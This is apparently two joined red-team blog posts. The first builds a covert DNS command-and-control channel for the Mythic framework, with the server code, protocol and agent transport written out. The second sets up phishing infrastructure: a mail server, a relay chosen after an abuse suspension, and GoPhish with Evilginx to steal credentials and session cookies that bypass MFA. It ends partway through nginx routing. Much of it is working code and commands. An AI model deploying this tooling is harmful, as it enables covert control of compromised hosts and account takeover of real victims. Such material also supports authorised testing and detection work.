item.content:
This post covers the full process of building a custom DNS command and control profile from scratch and integrating it into the Mythic C2 framework. This includes the DNS infrastructure setup, the Mythic C2 profile container, the protocol design, the agent-side transport, and the builder integration.

Why DNS C2

Most network monitoring focuses on HTTP/HTTPS traffic. DNS is different, it’s treated as essential infrastructure and is almost never blocked outright. Firewalls that would catch an HTTP callback to an unknown IP will happily pass a DNS query to an external nameserver. This makes DNS an ideal covert channel in restrictive environments.

The tradeoff is bandwidth. DNS labels are limited to 63 characters each, and a full FQDN can’t exceed 253 characters. You’re not going to exfiltrate large files over DNS, but for task dispatch, small command output, and maintaining a beacon, it works very well.

How It Works

The fundamental idea is to abuse the DNS query/response cycle as a bidirectional communication channel:

  • The agent encodes data into DNS query names : for example, s.a9f4.0003.0014.aGVsbG8=.d4e8f2a1.infra.domain.name
  • Your VM is the authoritative nameserver for infra.domain.name, so all queries for that zone land on your machine directly
  • A Python DNS server on your VM decodes the query, processes it, and returns data in the TXT record of the response
  • The agent reads the TXT response and reassembles it

No HTTP. No TCP connections to suspicious IPs. From the network’s perspective, it’s just DNS traffic.

DNS Infrastructure

Disabling systemd-resolved Stub Listener

By default, Ubuntu’s systemd-resolved binds to port 53 on localhost. This would conflict with our DNS server. We need to free up the port while keeping DNS resolution working.

Edit the resolved config:

sudo nano /etc/systemd/resolved.conf

Add or uncomment:

DNSStubListener=no

Restart:

sudo systemctl restart systemd-resolved

Verify the port is now free:

sudo ss -tlnp | grep 53

DNS resolution still works because systemd-resolved continues to function via its socket at /run/systemd/resolve/stub-resolv.conf, it just no longer binds port 53.

Opening Port 53 in Azure NSG

Since the Mythic VM is on Azure, port 53 needs an inbound NSG rule for both TCP and UDP:

Both are needed, DNS uses UDP by default but falls back to TCP for large responses.

DNS Delegation in Cloudflare

This is the key piece. We need to make our VM the authoritative nameserver for a subdomain of our domain. Everything under infra.domain.name needs to resolve by asking our VM, not Cloudflare.

Add these two records in Cloudflare:

Type Name Value Proxy
A ns1 <Mythic VM IP> ⚫ DNS only
NS infra ns1.domain.name ⚫ DNS only

The NS record says: “for anything under infra.domain.name, ask ns1.domain.name”. The A record resolves ns1.domain.name to our VM. Both must be DNS only, no Cloudflare proxy.

Verify the delegation from an external machine:

dig NS infra.domain.name
dig TXT test.infra.domain.name

The NS query should return ns1.domain.name. The TXT query will time out or return SERVFAIL. Expected, since nothing is listening yet.

Protocol Design

Before writing any code, we designed the protocol. The constraints are:

  • DNS labels: max 63 characters each
  • Full FQDN: max 253 characters
  • Data encoding: base64url (safe for DNS labels)
  • Our domain infra.domain.name takes 18 characters plus dots

This leaves roughly 40 characters of usable data per chunk, we settled on 40 chars as our chunk size.

Packet Structure

Every DNS query from the agent follows this format:

<type>.<channel_id>.<seq>.<total>.<data>.<hmac>.infra.domain.name
Field Size Description
type 1 char Message type: r, s, p, e
channel_id 4 chars Hex channel ID assigned by server on registration
seq 4 chars Hex sequence number of this chunk
total 4 chars Hex total number of chunks
data ≤40 chars Base64url encoded chunk (padding stripped)
hmac 8 chars First 8 hex chars of HMAC-MD5 over channel+seq+data

Message Types

Type Direction Purpose
r Agent –> Server Register : get a channel ID assigned
s Agent –> Server Send : transmit a data chunk
p Agent –> Server Poll : request next outbound chunk
e Agent –> Server End : signal done receiving

Example Query

A real registration query looks like:

r.amao.2g8c.infra.domain.name: type TXT, class IN

A real send chunk looks like:

s.c7ff.0004.0014.MWRCWEVLencxNVdiL2xNdjR0RTZPbmNFQy9PZU5D.50106060.infra.domain.name: type TXT, class IN

Breaking that down:

  • s = send type
  • c7ff = channel ID
  • 0004 = sequence 4 (hex)
  • 0014 = total 20 chunks (hex)
  • MWRCWEV... = 40 chars of base64url data
  • 6644e1b9 = HMAC integrity check

Server Responses

The server responds with TXT records. Response values:

Value Meaning
<4-char hex> Registration response: your new channel ID
<4-char hex> Send response: next expected sequence number
DONE All chunks received, Mythic response is ready
ERR HMAC verification failed
<chunk>.<hmac> Poll response: data chunk with integrity check
END Poll response: no more chunks
IDLE Poll response: nothing ready yet
ACK End acknowledgement

HMAC Integrity

Every chunk is signed with HMAC-MD5 using a shared secret (weedns_secret in our implementation). The agent computes:

hmac_md5("weedns_secret", f"{channel_id}{seq}{chunk_clean}").hexdigest()[:8]

The server verifies the same. This prevents query spoofing and ensures chunk integrity. In a production engagement you would rotate this secret per payload.

Full Cycle Data Flow

1. Agent: r.xxxx.xxxx.infra.domain.name
   Server: "a9f4"  (channel ID assigned)
 
2. Agent: s.a9f4.0000.0014.<chunk0>.<hmac>.infra.domain.name
   Server: "0001"  (next expected seq)
 
   Agent: s.a9f4.0001.0014.<chunk1>.<hmac>.infra.domain.name
   Server: "0002"
 
   ... (20 chunks total) ...
 
   Agent: s.a9f4.0013.0014.<chunk19>.<hmac>.infra.domain.name
   Server: "DONE"  (all received, Mythic response ready)
 
3. Agent: p.a9f4.0000.infra.domain.name
   Server: "<chunk0>.<hmac>"
 
   Agent: p.a9f4.0001.infra.domain.name
   Server: "<chunk1>.<hmac>"
 
   ... (14 response chunks) ...
 
   Agent: p.a9f4.000d.infra.domain.name
   Server: "END"

The DNS C2 Profile Container

Mythic’s C2 profiles run as Docker containers. Each profile consists of two parts:

  • A Mythic-side definition that registers the profile, its parameters, and how to start the server
  • A server script that handles the actual protocol

We built ours in Python, mirroring the structure of the existing weeagent container.

Directory Structure

InstalledServices/dns_c2/
├── Dockerfile
├── main.py
├── rabbitmq_config.json
└── dns_c2/
    ├── __init__.py
    ├── mythic/
    │   ├── __init__.py
    │   └── c2_functions/
    │       ├── __init__.py
    │       └── dns_c2.py          # Mythic profile definition
    └── c2_code/
        ├── config.json            # Port and domain config
        └── dns_server.py          # Actual DNS server

Dockerfile

FROM itsafeaturemythic/mythic_python_base:latest
WORKDIR /Mythic/
RUN pip3 install dnslib aiohttp
CMD ["python3", "main.py"]

We use dnslib for DNS packet handling and aiohttp for forwarding messages to Mythic’s internal HTTP API.

main.py

import mythic_container
from dns_c2.mythic import *
 
mythic_container.mythic_service.start_and_run_forever()

rabbitmq_config.json

{
    "username": "mythic_user",
    "password": "mythic_password",
    "virtual_host": "mythic_vhost",
    "host": "127.0.0.1",
    "name": "hostname",
    "rabbitmq_password": "rabbitmq_password",
    "rabbitmq_host": "127.0.0.1",
    "mythic_server_host": "127.0.0.1",
    "container_files_path": "/Mythic/"
}

config.json

{
    "instances": [
        {
            "port": 53,
            "domain": "infra.domain.name",
            "debug": true
        }
    ]
}

Mythic Profile Definition

This file registers the profile with Mythic and defines the parameters shown in the UI when generating a payload.

from mythic_container.C2ProfileBase import *
from pathlib import Path
import os
import asyncio
import sys

class dns_c2(C2Profile):
    name = "dns"
    description = "DNS C2 profile using TXT records for covert communication"
    author = "@arvee"
    is_p2p = False
    is_server_routed = True
    server_folder_path = Path("/Mythic") / "dns_c2" / "c2_code"
    server_binary_path = server_folder_path / "dns_server.py"

    parameters = [
        C2ProfileParameter(
            name="dns_domain",
            description="C2 DNS domain (delegated NS zone)",
            default_value="infra.domain.name",
            parameter_type=ParameterType.String,
            required=True,
        ),
        C2ProfileParameter(
            name="dns_server",
            description="IP of your authoritative DNS server (this VM)",
            default_value="",
            parameter_type=ParameterType.String,
            required=True,
        ),
        C2ProfileParameter(
            name="callback_interval",
            description="Callback interval in seconds",
            default_value=10,
            parameter_type=ParameterType.Number,
            required=False,
        ),
        C2ProfileParameter(
            name="callback_jitter",
            description="Jitter percentage",
            default_value=10,
            parameter_type=ParameterType.Number,
            required=False,
        ),
        C2ProfileParameter(
            name="killdate",
            description="Kill date",
            default_value=365,
            parameter_type=ParameterType.Date,
            required=False,
        ),
        C2ProfileParameter(
            name="AESPSK",
            description="Encryption Type",
            default_value="aes256_hmac",
            parameter_type=ParameterType.ChooseOne,
            required=False,
            crypto_type=True,
            choices=["aes256_hmac", "none"],
        ),
        C2ProfileParameter(
            name="encrypted_exchange_check",
            description="Perform Key Exchange",
            default_value=True,
            parameter_type=ParameterType.Boolean,
            required=False,
        ),
    ]


    async def config_check(self, inputMsg: C2ConfigCheckMessage) -> C2ConfigCheckMessageResponse:
        response = C2ConfigCheckMessageResponse(Success=True)
        if not inputMsg.Parameters.get("dns_domain"):
            response.Success = False
            response.Error = "dns_domain is required"
            return response
        if not inputMsg.Parameters.get("dns_server"):
            response.Success = False
            response.Error = "dns_server is required"
            return response
        response.Message = "Configuration looks good"
        return response

    async def opsec_check(self, inputMsg: C2OPSECMessage) -> C2OPSECMessageResponse:
        response = C2OPSECMessageResponse(Success=True)
        domain = inputMsg.Parameters.get("dns_domain", "")
        if domain in ("infra.domain.name", ""):
            response.Message = "Warning: using default domain, make sure NS delegation is configured"
        else:
            response.Message = "Configuration looks good"
        return response

Key things to note:

  • is_server_routed = True tells Mythic that agents connect through this C2 profile’s server, not directly
  • server_binary_path is what Mythic executes when you click Start on the C2 profile page

The DNS Server

This is the core of the profile. It handles all incoming DNS queries, manages channel state, assembles inbound messages, forwards them to Mythic, and chunks outbound responses for DNS delivery.

The full file is long, here are the key components:

Helpers

HMAC_SECRET = b"weedns_secret"
 
def verify_hmac(data: str, sig: str) -> bool:
    expected = hmac.new(HMAC_SECRET, data.encode(), hashlib.md5).hexdigest()[:8]
    return hmac.compare_digest(expected, sig)
 
def make_hmac(data: str) -> str:
    return hmac.new(HMAC_SECRET, data.encode(), hashlib.md5).hexdigest()[:8]
 
def b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)
 
def b64url_encode(b: bytes) -> str:
    return base64.b64encode(b).decode().replace("+", "-").replace("/", "_").replace("=", "")

Mythic Bridge

This is how the server forwards assembled agent messages to Mythic’s internal API. The mythic: dns header is mandatory, without it Mythic rejects the request with a 400 and logs Failed to get 'mythic' header.

MYTHIC_URL = "http://127.0.0.1:17443"
 
async def forward_to_mythic(data: bytes) -> bytes:
    async with aiohttp.ClientSession() as session:
        async with session.post(
            f"{MYTHIC_URL}/agent_message",
            data=data,
            headers={
                "Content-Type": "application/octet-stream",
                "mythic": "dns"
            },
            timeout=aiohttp.ClientTimeout(total=10)
        ) as resp:
            return await resp.read()

Inbound Assembly

The server stores chunks in a dict keyed by channel ID. Once all chunks arrive it assembles and decodes them:

def assemble_inbound(channel_id: str) -> bytes | None:
    ch = channels.get(channel_id)
    total = ch.get("inbound_total", 0)
    chunks = ch["inbound"]
    if len(chunks) < total:
        return None
    assembled = ""
    for i in range(total):
        assembled += chunks[i]
    assembled += "=" * (-len(assembled) % 4)
    return b64url_decode(assembled)

Outbound Chunking

The raw Mythic HTTP response bytes are base64url encoded and split into 40-char chunks for DNS delivery:

def prepare_outbound(channel_id: str, data: bytes):
    encoded = b64url_encode(data)
    chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
    channels[channel_id]["outbound"] = chunks
    channels[channel_id]["state"] = "send"

DNS Resolver

The resolver handles all four message types. The send handler (s) is the most complex, it receives chunks, verifies HMAC, assembles the message when complete, forwards to Mythic, and signals DONE to the agent:

elif msg_type == "s":
    seq   = int(parts[2], 16)
    total = int(parts[3], 16)
    data  = parts[4]
    sig   = parts[5]
 
    if not verify_hmac(f"{channel_id}{seq}{data}", sig):
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("ERR")))
        return reply
 
    channels[channel_id]["inbound"][seq] = data
    channels[channel_id]["inbound_total"] = total
 
    received = set(channels[channel_id]["inbound"].keys())
    next_seq = 0
    while next_seq in received:
        next_seq += 1
 
    if next_seq >= total:
        assembled = assemble_inbound(channel_id)
        mythic_response = sync_forward_to_mythic(assembled)
        prepare_outbound(channel_id, mythic_response)
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("DONE")))
    else:
        reply.add_answer(RR(qname, QTYPE.TXT,
            rdata=TXT(format(next_seq, "04x"))))

The poll handler (p) serves chunks sequentially:

elif msg_type == "p":
    seq = int(parts[2], 16)
    ch = channels.get(channel_id)
 
    if not ch or ch["state"] != "send" or not ch["outbound"]:
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("IDLE")))
        return reply
 
    chunks = ch["outbound"]
    if seq >= len(chunks):
        channels[channel_id]["state"] = "idle"
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("END")))
    else:
        chunk = chunks[seq]
        sig = make_hmac(f"{channel_id}{seq}{chunk}")
        reply.add_answer(RR(qname, QTYPE.TXT,
            rdata=TXT(f"{chunk}.{sig}")))

Server Startup

Both UDP and TCP are served on port 53:

udp_server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
tcp_server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=True)
udp_server.start_thread()
tcp_server.start_thread()

Installing Into Mythic

cd /home/arvee/Mythic
sudo ./mythic-cli add dns_c2
sudo ./mythic-cli build dns_c2

Verify it starts and connects to RabbitMQ:

sudo ./mythic-cli logs dns_c2

You should see:

CRITICAL ... GetConnection ... [+] Successfully connected to rabbitmq

The DNS profile now appears in Mythic.

Agent-Side Transport

The transport layer lives in the agent and is responsible for encoding data into DNS queries and decoding responses. It follows the exact same template structure as the existing HTTP transport in weeagent, so the builder can inject it transparently.

Template Structure

The transport file uses section markers that the builder’s template engine replaces:

### IMPORTS ###
### CLASS_FIELDS ###
### FUNCTIONS ###
### CONFIG ###

Raw DNS Implementation

We implemented DNS queries from scratch using Python’s socket and struct modules, no external dependencies. This keeps the agent portable and avoids needing dnspython on the target.

def _dns_txt_query(self, fqdn):
    dns_server = self.agent_config["DNSServer"]
    tx_id = random.randint(0, 65535)
    flags = 0x0100
    header = struct.pack(">HHHHHH", tx_id, flags, 1, 0, 0, 0)
 
    labels = b""
    for part in fqdn.split("."):
        encoded = part.encode()
        labels += struct.pack("B", len(encoded)) + encoded
    labels += b"\x00"
 
    question = labels + struct.pack(">HH", 16, 1)  # TXT, IN
    packet = header + question
 
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    sock.sendto(packet, (dns_server, 53))
    response, _ = sock.recvfrom(4096)
    sock.close()
 
    return self._parse_dns_txt_response(response, tx_id)

The response parser manually walks the DNS wire format to extract TXT strings:

def _parse_dns_txt_response(self, data, expected_tx_id):
    tx_id = struct.unpack(">H", data[0:2])[0]
    if tx_id != expected_tx_id:
        return ""
    ancount = struct.unpack(">H", data[6:8])[0]
    if ancount == 0:
        return ""
 
    offset = 12
    # skip question section
    while data[offset] != 0:
        offset += data[offset] + 1
    offset += 5  # null byte + qtype + qclass
 
    # parse answer TXT records
    result = ""
    for _ in range(ancount):
        if (data[offset] & 0xC0) == 0xC0:
            offset += 2
        else:
            while data[offset] != 0:
                offset += data[offset] + 1
            offset += 1
        rtype, _, _, rdlength = struct.unpack(">HHIH", data[offset:offset+10])
        offset += 10
        if rtype == 16:
            end = offset + rdlength
            pos = offset
            while pos < end:
                txt_len = data[pos]; pos += 1
                result += data[pos:pos+txt_len].decode(errors="replace")
                pos += txt_len
        offset += rdlength
    return result

Registration

On first use, the agent registers with the server to get a channel ID:

def _register(self):
    fqdn = "r.{}.{}.{}".format(
        self._random_str(4),
        self._random_str(4),
        self.agent_config["C2Domain"]
    )
    response = self._dns_txt_query(fqdn)
    if response and len(response) == 4:
        self.agent_config["_channel_id"] = response
        return True
    return False

Sending Data

Data is base64url encoded and split into 40-char chunks. Each chunk’s HMAC is computed on the cleaned chunk (padding stripped) since = signs aren’t valid in DNS labels:

def _send_chunks(self, encoded_data):
    chunks = [encoded_data[i:i+40] for i in range(0, len(encoded_data), 40)]
    total = len(chunks)
    channel = self.agent_config.get("_channel_id", "0000")
 
    for seq, chunk in enumerate(chunks):
        chunk_clean = chunk.rstrip("=")
        sig = self._make_hmac(f"{channel}{seq}{chunk_clean}")
        fqdn = "s.{}.{:04x}.{:04x}.{}.{}.{}".format(
            channel, seq, total, chunk_clean, sig,
            self.agent_config["C2Domain"]
        )
        response = self._dns_txt_query(fqdn)
        if not response:
            return ""
 
    return response

Polling for Responses

After sending, the agent polls sequentially for response chunks. Each chunk is HMAC verified before being added to the assembled buffer:

def _poll_chunks(self):
    channel = self.agent_config.get("_channel_id", "0000")
    assembled = ""
    seq = 0
 
    while True:
        fqdn = "p.{}.{:04x}.{}".format(channel, seq, self.agent_config["C2Domain"])
        response = self._dns_txt_query(fqdn)
 
        if not response or response == "IDLE":
            return b""
        if response == "END":
            break
 
        parts = response.split(".")
        if len(parts) < 2:
            break
        chunk, sig = parts[0], parts[1]
 
        if self._make_hmac(f"{channel}{seq}{chunk}") != sig:
            break
 
        assembled += chunk
        seq += 1
 
    try:
        return self._b64url_decode(assembled)
    except Exception:
        return b""

postMessageAndRetrieveResponse

This is the main interface that the agent core calls. It wraps the full send -> poll -> decrypt -> parse cycle:

def postMessageAndRetrieveResponse(self, data):
    if not self.agent_config.get("_channel_id"):
        if not self._register():
            return {}
 
    formatted = self.formatMessage(data)
    encoded = self._b64url_encode(formatted) if isinstance(formatted, bytes) else formatted
 
    result = self._send_chunks(encoded)
    if not result or result in ("ERR", ""):
        return {}
 
    if result == "DONE":
        raw = self._poll_chunks()
        if not raw:
            return {}
        try:
            decrypted = self.decrypt(raw)
            if not decrypted:
                return {}
            return self.formatResponse(decrypted)
        except Exception:
            return {}
    return {}

Note that decrypt is called on the raw reassembled bytes before formatResponse. The Mythic response format is uuid(36 bytes) + iv(16) + ciphertext + hmac(32), all binary. The decrypt function in crypto_lib.py3 handles the AES-256-CBC decryption and HMAC verification.

CONFIG Section

The config section tells the builder what placeholders to replace:

### CONFIG ###
            "C2Domain": "C2DOMPLACEHOLDER",
            "DNSServer": "DNSSRVPLACEHOLDER",
            "_channel_id": "",
            "Sleep": callback_interval,
            "Jitter": callback_jitter,

Builder Integration

The builder.py in weeagent needed two changes to support the DNS profile.

Adding dns to c2_profiles

c2_profiles = ["http", "dns"]

Adding DNS Parameter Replacements

In _apply_c2_parameter_replacements:

replacements = {
    # ... existing http replacements ...
    "C2DOMPLACEHOLDER": params.get("dns_domain", ""),
    "DNSSRVPLACEHOLDER": params.get("dns_server", ""),
}

The placeholders are wrapped in quotes in the CONFIG section of the transport template, so the builder replaces them as string values:

"C2Domain": "C2DOMPLACEHOLDER",   # becomes "C2Domain": "infra.domain.name"
"DNSServer": "DNSSRVPLACEHOLDER", # becomes "DNSServer": "10.20.30.40"

Updating the Build Selection Logic

The build function previously only looked for http:

for c2 in self.c2info:
    profile_name = c2.get_c2profile()["name"]
    if profile_name in ("http", "dns"):
        selected_c2 = c2
        break

Verification

Test DNS Resolution

From any external machine, verify the delegation is working:

dig TXT r.test.test.infra.domain.name @<your-vm-ip>

You should get a TXT response containing a 4-character hex channel ID, the server registered the connection and assigned it.

Generate a Payload

In the Mythic UI:

  1. Payloads → Generate New Payload
  2. Select WeeAgent
  3. Select dns as the C2 profile
  4. Fill in dns_domain (infra.domain.name) and dns_server (your VM IP)
  5. Click Generate

Start the C2 Profile

In C2 Profiles, click Start next to the dns profile. The dns_server.py subprocess starts and binds to port 53.

python3 weeagent.py

And in the Mythic UI, a new callback appears:

Architecture Summary

item.content:
Today, we’re setting up email. Those of you who are familiar with the self-hosting sphere know how much of a pain it is to set up email yourself. Hopefully, this guide will help beginner red teamers or just curious people understand the specific way I set up my phishing infrastructure.

Registering a Domain Name && Setting up an Azure VM

I’ll be combining Azure, Namecheap and Cloudflare for this part, but you can choose any alternatives that you like for any of these services.

Registering a Domain

First thing to do of course, is to get yourself a domain name, I got mine from Namecheap but you can use whatever domain registrar you’re familiar with.

I next sat up mine with Cloudflare, but you don’t necessarily have to for this specific guide.

Setting up an Azure VM

Provisioning

I won’t go into too much detail concerning how to provision a compute resource from Azure, it’s pretty straight forward, but for the sake of clarity, here’s the parameters I chose :

  • Ubuntu server 24.04 LTS
  • 2 vCPUs
  • 8 GB of RAM

The rest of the parameters don’t really matter that much for the purposes of this post.

Network Settings

Since we’ll be experimenting with email, there are a few ports we’ll need to open.

  • Inbound

    • 80 : Needed by Certbot and for the ACME challenge later on (you can disallow it afterward).
    • 443 : HTTPS since we’ll be using real looking websites that need to run on the default port.
    • 25/465/587 : SMTP

  • Outbound

    • Everything

DNS Records

You’ll need to add a few DNS records throughout this entire post, but for now, start by setting the following ones :

  • MX : domain.name -> mail.domain.name
  • A : mail -> 11.10.09.08 (Your VM IP)
  • TXT : domain.name -> “v=spf1 ip4:11.10.09.08 -all”

note : Throughout this article, I’ll be referring to the domain name as domain.name (you should change that with the one you bought) and the IP of the VM will be 11.10.09.08 (Also change it)

If you’re not familiar with SPF, it stands for Sender Policy Framework which is an email authentication method that verifies whether a mail server is authorized to send emails on behalf of a specific domain.

  • v=spf1 : SPF version
  • ip4:11.10.09.08 : ONLY your Azure VM is allowed to send mail
  • -all : hard fail for anything else (strict, recommended for security)

Also think of removing any remaining DNS records that relate to your registrar.

Email Services

Installing Postfix

On your Azure VM:

sudo apt update
sudo apt install postfix openssl -y

Configuring Postfix

When a configuration screen pops up, you’ll need to choose Internet Site.

And input your domain name.

Now prepare yourself for a bunch of troubleshooting steps, I’ll leave my censored config file at the bottom of this article. We need to adjust it to support authenticated SMTP, TLS encryption, and external relay handling.

Most of this configuration happens in /etc/postfix/main.cf

Basic Identity Configuration

First, we define the identity of the mail server :

myhostname = mail.domain.name
mydomain = domain.name
myorigin = $mydomain
inet_interfaces = all
mydestination = $myhostname, localhost.$mydomain, localhost

This ensures the server correctly identifies itself when sending emails.

Enabling SMTP Authentication (SASL)

To allow authenticated users to send emails through the server, we enable SASL authentication:

smtpd_sasl_type = dovecot
smtpd_sasl_path = private/auth

smtpd_sasl_auth_enable = yes
smtpd_sasl_security_options = noanonymous

This is what allows tools like Gophish (or any SMTP client) to authenticate using a username and password before sending mail.

Enabling TLS encryption (STARTTLS / SMTPS)

First, we install certbot and get our TLS certificate :

sudo apt install certbot -y

sudo certbot certonly --standalone -d mail.domain.name
sudo certbot certonly --standalone -d *.domain.name

Then you’ll have to change the /etc/postfix/main.cf file :

smtpd_tls_cert_file = /etc/letsencrypt/live/mail.domain.name/fullchain.pem
smtpd_tls_key_file  = /etc/letsencrypt/live/mail.domain.name/privkey.pem

smtpd_use_tls = yes
smtpd_tls_auth_only = yes
smtpd_tls_security_level = may

smtp_tls_security_level = encrypt
smtp_tls_CAfile = /etc/ssl/certs/ca-certificates.crt
smtp_tls_CApath = /etc/ssl/certs

DKIM Integration (OpenDKIM)

At this point, emails can be sent, but that doesn’t mean they’ll be trusted.

This is where DKIM (DomainKeys Identified Mail) comes in. It’s an authentication mechanism that allows a mail server to cryptographically sign outgoing emails, proving that they were actually sent by your domain and not modified in transit.

Install OpenDKIM
sudo apt install opendkim opendkim-tools -y
Generate DKIM Keys

Create a directory for your domain:

sudo mkdir -p /etc/opendkim/keys/domain.name
cd /etc/opendkim/keys/domain.name

Generate the key pair:

sudo opendkim-genkey -s mail -d domain.name

This creates two files:

  • mail.private : private key (keep this on the server)
  • mail.txt : DNS record (public key)
Fix Permissions

OpenDKIM needs access to the private key:

sudo chown -R opendkim:opendkim /etc/opendkim/keys
sudo chmod 700 /etc/opendkim/keys/domain.name
sudo chmod 600 /etc/opendkim/keys/domain.name/mail.private
Configure OpenDKIM

Edit /etc/opendkim.conf. Make sure you have:

Socket                  inet:8891@localhost

KeyTable                /etc/opendkim/key.table
SigningTable            refile:/etc/opendkim/signing.table
Create KeyTable
sudo nano /etc/opendkim/key.table

Add mail._domainkey.domain.name domain.name:mail:/etc/opendkim/keys/domain.name/mail.private

Create SigningTable
sudo nano /etc/opendkim/signing.table

Add *@domain.name mail._domainkey.domain.name

##### Add DKIM DNS record

Open the generated file:

cat /etc/opendkim/keys/domain.name/mail.txt

You’ll see something like:

Add this as a TXT record in your DNS:

  • Name: mail._domainkey.domain.name
  • Value: everything inside the quotes (concatenated into one line)
Verify DKIM

Check that the key is correctly published:

sudo opendkim-testkey -d domain.name -s mail -vvv

Expected result:

Setting up DMARC (Domain Policy Layer)

At this point, SPF and DKIM are already configured. However, modern mail providers also rely on DMARC to decide how to handle unauthenticated emails.

DMARC acts as a policy layer on top of SPF and DKIM, defining what happens when authentication fails.

Adding a DMARC Record

_dmarc.domain.name

Value: v=DMARC1; p=none; rua=mailto:admin@domain.name

Extra Touches

I would also advise adding a user to send emails, in this case I added mailuser

sudo adduser mailuser

You’ll need the username and password in base64 for testing later on.

Test N°1

If you’re using a cloud provider like this setup portrays, you’ll have trouble sending emails on the default port (25) :

The email will be queued and the logs will show that it is sent but it won’t actually go beyond the filters that Azure set in place. So we’ll have to set up an email relay that can actually propagate our emails.

Using an SMTP Relay (Outbound Delivery)

In this setup, I initially used Brevo, which provides authenticated SMTP access over port 587. However, the account was later suspended due to automated abuse detection systems, which are commonly triggered when sending patterns resemble phishing or non-standard transactional behavior.

After this, I switched to Resend, which is more developer-oriented and better suited for programmatic email delivery in testing environments, provided proper domain authentication (SPF, DKIM, DMARC) is correctly configured.

Configuring Postfix to Use Resend

You’ll need to sign up to Resend (for free), approve your domain (very easy on screen steps provided by resend) and get your API key that would be used as a password later on.

We now modify Postfix to route all outbound emails through the relay provider instead of sending them directly.

Edit /etc/postfix/main.cf:

relayhost = [smtp-relay.provider.com]:587

smtp_sasl_auth_enable = yes
smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
smtp_sasl_security_options = noanonymous

smtp_use_tls = yes
smtp_tls_security_level = encrypt

##### Adding Relay Credentials

Create the authentication file:

sudo nano /etc/postfix/sasl_passwd

Format: [smtp-relay.provider.com]:587 username:password

The username will always be resend for this setup and the password would be the API key.

Then apply the configuration:

sudo postmap /etc/postfix/sasl_passwd
sudo chmod 600 /etc/postfix/sasl_passwd*
sudo systemctl restart postfix

Now if you do same test as earlier, it normally should work.

Setting Up the Phishing Pipeline

Now that we have a working email infrastructure, it’s time to build the actual phishing pipeline on top of it. This is where things get interesting. We’ll be adding two tools to our existing VM: GoPhish for campaign management and email tracking, and Evilginx for adversary-in-the-middle credential harvesting.

The goal is to have a complete chain:

GoPhish (sends email) → target clicks link → Evilginx (captures credentials + session tokens) → Mythic C2 (post-exploitation)

Before diving in, it’s worth understanding why we need both tools. GoPhish handles the email delivery side, it lets you manage campaigns, track who opened emails, who clicked links, and who submitted credentials. Evilginx, on the other hand, is a Man-in-the-Middle proxy that sits between the victim and the real login page. Instead of faking a login page, it proxies the actual website, which means the victim sees a fully legitimate interface: valid TLS certificate, real branding, real behavior. The crucial difference is that Evilginx captures not just credentials, but authenticated session cookies, which means MFA is bypassed entirely.

DNS Records

Before installing anything, we need to update our DNS configuration. We’ll be adding two new subdomains:

  • track.domain.name : GoPhish’s phishing listener, used for link tracking and click detection
  • login.domain.name : Evilginx’s proxy endpoint, where victims will land

In Cloudflare (or your DNS provider), add the following A records, both pointing to your VM’s public IP:

Type Name Value Proxy Status
A track 11.10.09.08 DNS only (grey)
A login 11.10.09.08 DNS only (grey)

Both records must be set to DNS only (grey cloud in Cloudflare). If they are proxied through Cloudflare, Evilginx won’t be able to perform TLS termination, and GoPhish’s tracking will break. This is a common mistake, Cloudflare’s proxy layer interferes with the way both tools handle HTTPS.

Firewall / NSG Rules

On Azure, make sure the following inbound port rules are configured on your VM’s Network Security Group:

Port Protocol Purpose
80 TCP ACME challenge (cert issuance)
443 TCP Evilginx + GoPhish HTTPS
3333 TCP GoPhish admin UI

Port 3333 is GoPhish’s admin interface. We’ll be accessing it through an SSH tunnel, so it doesn’t strictly need to be public-facing, but opening it on the NSG level makes initial setup easier. You can restrict it to your IP only for better OPSEC.

TLS Certificates

Since we already have certbot installed and configured, and since we already have a wildcard certificate for *.domain.name, we don’t need to issue any new certificates. The wildcard covers both track.domain.name and login.domain.name automatically.

Verify the existing wildcard cert:

sudo certbot certificates

You should see something like:

Certificate Name: domain.name
  Domains: *.domain.name
  Expiry Date: 2026-07-16 (VALID: 87 days)
  Certificate Path: /etc/letsencrypt/live/domain.name/fullchain.pem
  Private Key Path: /etc/letsencrypt/live/domain.name/privkey.pem

We’ll be referencing these certificate paths throughout the nginx and Evilginx configurations.

Evilginx

What Is Evilginx?

Evilginx is an adversary-in-the-middle attack framework that works by acting as a reverse proxy between the victim and a legitimate website. When a victim visits your Evilginx lure URL:

  1. Evilginx proxies all requests transparently to the real website (e.g. Microsoft, Google)
  2. The victim sees the real login page with a valid TLS certificate
  3. Evilginx intercepts and stores the credentials entered
  4. Evilginx also captures the authenticated session cookies returned after login

That last point is what makes Evilginx particularly powerful, because it captures post-authentication session cookies, it completely bypasses MFA. It doesn’t matter if the target uses SMS codes, authenticator apps, or hardware keys. Once they log in, you have their session.

Evilginx uses phishlets, YAML configuration files that describe how to proxy a specific target website. The community maintains phishlets for Microsoft 365, Google, LinkedIn, and many others.

Installation

Download the latest release from GitHub:

cd /opt
sudo wget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.zip
mkdir evilginx && cd evilginx && mv ../evilginx-v3.3.0-linux-64bit.zip ./
sudo unzip evilginx-v3.3.0-linux-64bit.zip
sudo chmod +x evilginx

Create a directory for phishlets if it’s not already there:

sudo mkdir -p /opt/evilginx/phishlets

Phishlets

Evilginx 3.x ships with only a minimal example phishlet by default. To get real phishlets for Microsoft, Google, and others, we pull from the community collection:

cd /opt/evilginx/phishlets
sudo git clone https://github.com/An0nUD4Y/Evilginx-Phishlets.git

I only installed the Microsoft phishlet for testing, but if you did things right, you’ll have way more.

nginx as a Front Router

Since we’re running both GoPhish and Evilginx on the same VM, and since nginx is already present and handling port 443, we need a smart routing strategy.

